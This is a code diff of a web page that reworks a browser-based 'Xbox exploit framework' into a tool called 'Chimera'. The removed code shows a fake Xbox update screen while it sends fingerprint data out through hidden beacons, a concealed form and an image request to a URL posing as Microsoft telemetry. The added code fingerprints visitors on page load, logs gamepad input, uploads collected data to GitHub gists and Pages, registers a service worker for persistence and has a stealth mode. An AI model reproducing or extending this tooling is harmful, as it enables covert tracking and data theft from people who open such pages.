+                session: Chimera.data.sessionId,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                collectedData: Chimera.data.collected.length
+            }, 'Chimera Session Data');
+        }
+        
+        function loadCommands() {
+            Chimera.github.loadCommands().then(commands => {
+                Chimera.terminal.log(`Loaded ${commands.length} commands`, 'success');
+            });
+        }
+        
+        function startExfiltration() {
+            Chimera.terminal.log('Starting data exfiltration...', 'warning');
+            
+            // Collect all data
+            const exfilData = {
+                session: Chimera.data.sessionId,
+                fingerprint: Chimera.data.fingerprint,
+                vulnerabilities: Chimera.data.vulnerabilities,
+                collected: Chimera.data.collected,
+                timestamp: Date.now()
+            };
+            
+            // Try multiple methods
+            Chimera.github.createGist(exfilData, 'Chimera Exfiltration Data');
+            Chimera.github.exfilToPages(exfilData);
+            
+            // Also create download
+            const blob = new Blob([JSON.stringify(exfilData, null, 2)], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `chimera_${Date.now()}.json`;
+            a.click();
+            
+            Chimera.terminal.log('Data exfiltration initiated', 'success');
+        }
+        
+        function deployPayload() {
+            Chimera.terminal.log('🚀 DEPLOYING PAYLOAD...', 'warning');
+            
+            // Create final payload
+            const payload = {
+                type: 'chimera_final',
+                session: Chimera.data.sessionId,
+                system: Chimera.data.fingerprint,
+                exploits: Chimera.data.vulnerabilities,
+                timestamp: Date.now(),
+                delivery: 'github_pages'
+            };
+            
+            // Store in multiple locations
+            localStorage.setItem('chimera_payload', JSON.stringify(payload));
+            Chimera.github.createGist(payload, 'Chimera Final Payload');
+            
+            // Create persistence
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(reg => {
+                        Chimera.terminal.log('Service Worker registered for persistence', 'success');
+                    })
+                    .catch(err => {
+                        Chimera.terminal.log('Service Worker registration failed', 'error');
+                    });
+            }
+            
+            Chimera.terminal.log('✅ PAYLOAD DEPLOYED SUCCESSFULLY', 'success');
+        }
+        
+        function detectXbox() {
+            Chimera.modules.fingerprint.detectXbox();
+        }
+        
+        function captureGamepad() {
+            if ('getGamepads' in navigator) {
+                Chimera.terminal.log('Starting gamepad input capture...', 'info');
+                setInterval(() => {
+                    const gamepads = navigator.getGamepads();
+                    gamepads.forEach((pad, idx) => {
+                        if (pad) {
+                            const buttons = pad.buttons.map((b, i) => b.pressed ? i : -1).filter(i => i !== -1);
+                            if (buttons.length > 0) {
+                                Chimera.terminal.log(`Gamepad ${idx}: buttons ${buttons.join(',')}`, 'info');
+                            }
+                        }
+                    });
+                }, 1000);
+            }
+        }
+        
+        function toggleStealth() {
+            Chimera.config.stealth.enabled = !Chimera.config.stealth.enabled;
+            Chimera.terminal.log(`Stealth mode ${Chimera.config.stealth.enabled ? 'ENABLED' : 'DISABLED'}`, 
+                               Chimera.config.stealth.enabled ? 'success' : 'warning');
+        }
+        
+        function exportToGitHub() {
+            startExfiltration();
+        }
+        
+        function emergencyWipe() {
+            if (confirm('🚨 EMERGENCY WIPE - This will delete all local data. Continue?')) {
+                localStorage.clear();
+                sessionStorage.clear();
+                Chimera.data.collected = [];
+                Chimera.terminal.clear();
+                Chimera.terminal.log('🔄 ALL DATA WIPED - System reset', 'error');
+            }
+        }
+        
+        function clearTerminal() {
+            Chimera.terminal.clear();
+        }
+        
+        function exportTerminal() {
+            const logs = Chimera.terminal.lines.map(l => `[${l.time}] ${l.message}`).join('\n');
+            const blob = new Blob([logs], {type: 'text/plain'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `chimera_logs_${Date.now()}.txt`;
+            a.click();
+        }
+        
+        function toggleAutoScroll() {
+            Chimera.terminal.autoScroll = !Chimera.terminal.autoScroll;
+            Chimera.terminal.log(`Auto-scroll ${Chimera.terminal.autoScroll ? 'ENABLED' : 'DISABLED'}`, 'info');
+        }
+        
+        function handleTerminalCommand(event) {
             if (event.key === 'Enter') {
-                const input = document.getElementById('consoleInput');
+                const input = document.getElementById('terminalInput');
                 const command = input.value.trim();
                 input.value = '';
                 
-                if (!exploitFramework) {
-                    exploitFramework = new XboxExploitFramework();
-                }
-                
-                exploitFramework.log(`> ${command}`, 'info');
+                Chimera.terminal.log(`> ${command}`, 'secret');
                 
                 // Process commands
                 switch(command.toLowerCase()) {
                     case 'help':
-                        exploitFramework.log('Commands: status, scan, exfiltrate, deploy, cleanup, exit', 'info');
+                        Chimera.terminal.log('Available commands: scan, exploit, github, stealth, wipe, clear', 'info');
                         break;
-                        
-                    case 'status':
-                        exploitFramework.log(`Stage: ${exploitFramework.stage}/${exploitFramework.maxStage}`, 'info');
-                        exploitFramework.log(`Vulnerabilities: ${exploitFramework.vulnerabilities.length}`, 'warning');
-                        exploitFramework.log(`Payload delivered: ${exploitFramework.payloadDelivered}`, 'info');
-                        break;
-                        
                     case 'scan':
-                        exploitFramework.stage3_apiExploration();
+                        startRecon();
                         break;
-                        
-                    case 'exfiltrate':
-                        exploitFramework.exfiltrateData();
+                    case 'exploit':
+                        exploitScan();
                         break;
-                        
-                    case 'deploy':
-                        deployPayload();
+                    case 'github':
+                        testGitHubAPI();
                         break;
-                        
-                    case 'cleanup':
-                        exploitFramework.cleanupTraces();
+                    case 'stealth':
+                        toggleStealth();
                         break;
-                        
-                    case 'exit':
-                        toggleDebug();
+                    case 'wipe':
+                        emergencyWipe();
                         break;
-                        
+                    case 'clear':
+                        clearTerminal();
+                        break;
                     default:
-                        exploitFramework.log(`Unknown command: ${command}`, 'error');
+                        Chimera.terminal.log(`Unknown command: ${command}`, 'error');
                 }
             }
         }
         
-        function deployPayload() {
-            if (!exploitFramework) {
-                exploitFramework = new XboxExploitFramework();
-            }
-            
-            exploitFramework.log('🚀 DEPLOYING FINAL PAYLOAD', 'critical');
-            
-            // Create final payload
-            const payload = {
-                type: 'FINAL_EXPLOIT',
-                timestamp: Date.now(),
-                system: exploitFramework.exploitData.system,
-                vulnerabilities: exploitFramework.vulnerabilities,
-                exploitData: exploitFramework.exploitData
-            };
-            
-            // Encode and exfiltrate
-            const encoded = btoa(JSON.stringify(payload));
-            exploitFramework.log(`Payload size: ${encoded.length} bytes`, 'info');
-            
-            // Multiple exfiltration methods
-            exfiltrateViaBeacon(encoded);
-            exfiltrateViaImage(encoded);
-            exfiltrateViaForm(encoded);
-            
-            // Store locally
-            localStorage.setItem('xbox_exploit_payload', encoded);
-            
-            // Show success
-            exploitFramework.updateDetail('detailText', 'Payload deployed successfully ✓');
-            exploitFramework.updateDetail('securityText', 'System compromised - Awaiting further instructions');
-            
-            document.getElementById('payloadButton').disabled = true;
-            document.getElementById('payloadButton').textContent = 'PAYLOAD DEPLOYED ✓';
-            
-            exploitFramework.payloadDelivered = true;
-            exploitFramework.log('FINAL PAYLOAD DELIVERED SUCCESSFULLY', 'success');
-        }
-        
-        function exfiltrateViaBeacon(data) {
-            if (navigator.sendBeacon) {
-                const blob = new Blob([data], {type: 'text/plain'});
-                navigator.sendBeacon(exploitFramework.beaconUrl, blob);
-            }
-        }
-        
-        function exfiltrateViaImage(data) {
-            const img = new Image();
-            img.src = `https://api.telemetry.microsoft.com/collect?v=1&d=${encodeURIComponent(data)}`;
-        }
-        
-        function exfiltrateViaForm(data) {
-            const form = document.createElement('form');
-            form.action = exploitFramework.beaconUrl;
-            form.method = 'POST';
-            form.style.display = 'none';
-            
-            const input = document.createElement('input');
-            input.name = 'payload';
-            input.value = data;
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            form.submit();
-            setTimeout(() => document.body.removeChild(form), 1000);
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
         }
         
         // ==================== INITIALIZATION ====================
         window.onload = function() {
-            // Start background fingerprinting immediately
+            // Auto-start fingerprinting
             setTimeout(() => {
-                if (!exploitFramework) {
-                    exploitFramework = new XboxExploitFramework();
-                    exploitFramework.log('System monitoring initialized', 'info');
-                }
-            }, 1000);
+                Chimera.terminal.log('Starting passive reconnaissance...', 'info');
+                Chimera.modules.fingerprint.detectAPIs();
+                
+                // Check for Xbox
+                Chimera.modules.fingerprint.detectXbox();
+                
+                // Update stats
+                updateStats();
+            }, 2000);
             
-            // Add some realistic update messages
-            const messages = [
-                "Preparing system for update...",
-                "Checking disk space...",
-                "Verifying update signature...",
-                "Connecting to Xbox Live...",
-                "Downloading critical security patches..."
-            ];
-            
-            let msgIndex = 0;
+            // Update system load periodically
             setInterval(() => {
-                if (msgIndex < messages.length) {
-                    document.getElementById('statusMessage').textContent = messages[msgIndex];
-                    msgIndex++;
+                const load = Math.floor(Math.random() * 30) + 10;
+                Chimera.updateSystemLoad(load);
+            }, 5000);
+            
+            // Auto-save data periodically
+            setInterval(() => {
+                if (Chimera.data.collected.length > 0) {
+                    localStorage.setItem('chimera_data', JSON.stringify(Chimera.data));
                 }
-            }, 3000);
+            }, 30000);
         };
     </script>
 </body>
